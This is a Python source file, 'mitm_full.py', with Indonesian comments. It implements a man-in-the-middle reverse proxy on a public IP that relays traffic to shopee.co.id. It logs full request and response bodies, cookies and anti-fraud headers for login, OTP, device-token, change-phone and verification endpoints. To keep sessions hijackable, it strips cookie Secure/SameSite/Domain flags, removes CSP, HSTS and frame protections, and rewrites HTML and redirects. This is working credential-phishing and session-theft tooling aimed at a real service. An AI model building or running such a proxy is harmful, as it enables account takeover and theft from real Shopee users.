# -*- coding: utf-8 -*-
"""mitm_full.py — MITM SUNGGUHAN: capture SEMUA request & response lengkap.

Berbeda dari proxy sebelumnya: ini menyimpan BODY request DAN BODY response,
header lengkap, status code. Semua ditulis ke JSONL.

Fokus: login_by_password, ivs/*, device-token/* — apa pun yang muncul.
"""
import http.server, socketserver, urllib.request, urllib.error, ssl, gzip, zlib
import json, time, os, re, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8894
UPSTREAM = "https://shopee.co.id"
TARGET_HOST = "shopee.co.id"
OUT = "/root/shopee-verify/mitm_capture.jsonl"
HOST_SELF = f"43.156.19.172:{PORT}"

HOP = {"connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
       "te", "trailers", "transfer-encoding", "upgrade", "content-length",
       "content-encoding", "host"}

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

INTEREST = ("login", "anti_fraud", "ivs", "device-token", "verify",
            "account", "change_phone", "otp", "cart")


def log(m):
    print(f"[{time.strftime('%H:%M:%S')}] {m}", flush=True)


def rec(entry):
    with open(OUT, "a") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


class Proxy(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _h(self, method):
        url = UPSTREAM + self.path
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else None

        req_headers = dict(self.headers.items())
        hd = {}
        for k, v in self.headers.items():
            if k.lower() in HOP:
                continue
            if k.lower() in ("origin", "referer") and "43.156.19.172" in v:
                v = "https://shopee.co.id"
            hd[k] = v
        hd["Host"] = TARGET_HOST
        hd["Accept-Encoding"] = "gzip"

        interesting = any(x in self.path.lower() for x in INTEREST)

        t0 = time.time()
        try:
            req = urllib.request.Request(url, data=body, method=method, headers=hd)
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX))
            resp = op.open(req, timeout=50)
            code = resp.status
            items = resp.getheaders()
            data = resp.read()
        except urllib.error.HTTPError as e:
            code = e.code
            items = list(e.headers.items())
            data = e.read()
        except Exception as e:
            log(f"ERR {method} {self.path[:60]} {str(e)[:50]}")
            self.send_error(502, "up")
            return

        dur = int((time.time() - t0) * 1000)

        rh, setcookies = {}, []
        enc = ""
        for k, v in items:
            if k.lower() == "set-cookie":
                setcookies.append(v)
            else:
                rh[k] = v
                if k.lower() == "content-encoding":
                    enc = v.lower()

        if enc == "gzip":
            try: data = gzip.decompress(data)
            except Exception: pass
        elif enc == "deflate":
            try: data = zlib.decompress(data)
            except Exception: pass

        # === REKAM kalau menarik ===
        if interesting:
            ck_req = req_headers.get("Cookie", "")
            ck_names = [c.split("=")[0].strip() for c in ck_req.split(";") if "=" in c]
            entry = {
                "ts": time.strftime("%H:%M:%S"),
                "method": method,
                "path": self.path[:200],
                "req_body": body.decode("utf-8", "ignore")[:3000] if body else None,
                "resp_code": code,
                "resp_body": data.decode("utf-8", "ignore")[:6000],
                "set_cookies": setcookies,
                "cookie_names": ck_names,
                "dur_ms": dur,
                "sap": {k: v[:120] for k, v in req_headers.items()
                        if k.lower().startswith(("x-sap", "af-ac"))},
            }
            rec(entry)
            log(f"📝 {method} {self.path[:60]} → {code} ({dur}ms) [{' '.join(ck_names[:3])}]")
        else:
            log(f"{method} {self.path[:60]} → {code}")

        # rewrite body
        ct = rh.get("Content-Type", "")
        if data and "html" in ct.lower():
            try:
                s = data.decode("utf-8", "ignore")
                s = s.replace("https://shopee.co.id", "").replace("http://shopee.co.id", "")
                s = s.replace(HOST_SELF, "shopee.co.id")
                inj = '<base href="/"><meta http-equiv="Content-Security-Policy" content="">'
                if "<head" in s.lower():
                    s = re.sub(r'(<head[^>]*>)', r'\1' + inj, s, count=1, flags=re.I)
                data = s.encode()
            except Exception:
                pass

        loc = rh.get("Location")
        if loc:
            if "shopee.co.id" in loc:
                loc = loc.replace("https://shopee.co.id", "").replace("http://shopee.co.id", "")
            if HOST_SELF in loc:
                loc = loc.replace(HOST_SELF, "shopee.co.id")
            rh["Location"] = loc

        cleaned = []
        for sc in setcookies:
            sc = re.sub(r';\s*[Dd]omain=[^;]*', '', sc)
            sc = re.sub(r';\s*[Ss]ecure\b', '', sc)
            sc = re.sub(r';\s*[Ss]ame[Ss]ite=[^;]*', '', sc)
            cleaned.append(sc)

        self.send_response(code)
        skip = {"content-length", "content-encoding", "connection",
                "transfer-encoding", "set-cookie", "location",
                "content-security-policy", "strict-transport-security",
                "x-frame-options"}
        for k, v in rh.items():
            if k.lower() in skip:
                continue
            self.send_header(k, v)
        if loc:
            self.send_header("Location", loc)
        for sc in cleaned:
            self.send_header("Set-Cookie", sc)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        try:
            self.wfile.write(data)
        except Exception:
            pass

    def do_GET(self): self._h("GET")
    def do_POST(self): self._h("POST")
    def do_PUT(self): self._h("PUT")
    def do_DELETE(self): self._h("DELETE")
    def do_HEAD(self): self._h("HEAD")

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "*")
        self.send_header("Content-Length", "0")
        self.end_headers()


class T(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    open(OUT, "w").close()
    log(f"MITM START :{PORT} -> {UPSTREAM}")
    T(("0.0.0.0", PORT), Proxy).serve_forever()
